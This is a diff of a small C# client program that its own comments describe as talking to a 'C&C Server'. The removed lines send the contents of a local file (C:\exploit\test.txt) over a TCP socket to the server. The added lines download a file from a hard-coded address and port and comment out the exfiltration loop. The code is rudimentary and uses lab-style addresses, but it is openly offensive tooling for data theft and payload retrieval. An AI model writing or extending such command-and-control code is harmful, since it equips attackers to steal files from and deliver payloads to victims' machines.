@@ -12,28 +12,41 @@ namespace Client
         private static void Main()
         {
             string HostName = "127.0.0.1"; //Address of C&C Server
-            int prt = 4444;
+            int prt = 4444; //Port od C&C Server
 
-            String S; //Just a test
+            WebClient web = new WebClient();
 
-
-            TcpClient tc = new TcpClient(HostName, prt);
-
-            NetworkStream ns = tc.GetStream();
-
-            FileStream fs = File.Open("C:\\exploit\\test.txt", FileMode.Open);
-
-            int data = fs.ReadByte();
-
-            while (data != -1)
+            try
             {
-                ns.WriteByte((byte)data);
-                data = fs.ReadByte();
-
+                web.DownloadFile("http://192.168.0.19:5555/MyFile.xml", "MyFile.xml");
             }
-            fs.Close();
-            ns.Close();
-            tc.Close();
+            catch
+            {
+                System.Console.WriteLine("Failed to Get File");
+            }
+
+            
+
+            System.Console.WriteLine("Success");
+            System.Console.ReadLine();
+
+            //TcpClient tc = new TcpClient(HostName, prt);
+
+            //NetworkStream ns = tc.GetStream();
+
+            //FileStream fs = File.Open("C:\\exploit\\test.txt", FileMode.Open);
+
+            //int data = fs.ReadByte();
+
+            //while (data != -1)
+            //{
+              //  ns.WriteByte((byte)data);
+                //data = fs.ReadByte();
+
+//            }
+  //          fs.Close();
+    //        ns.Close();
+      //      tc.Close();
        
             
         
